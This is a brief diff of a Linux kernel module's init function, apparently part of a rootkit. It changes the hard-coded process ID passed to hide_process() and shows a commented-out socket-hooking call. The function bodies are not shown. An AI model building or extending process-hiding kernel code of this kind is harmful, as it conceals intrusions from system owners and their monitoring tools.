@@ -23,7 +23,7 @@ int init_module (void)
 	//hook_sockets();
 	
 	// TODO: remove debug instructions after this
-	hide_process(25196);
+	hide_process(3611);
 
 	return 0;
 }
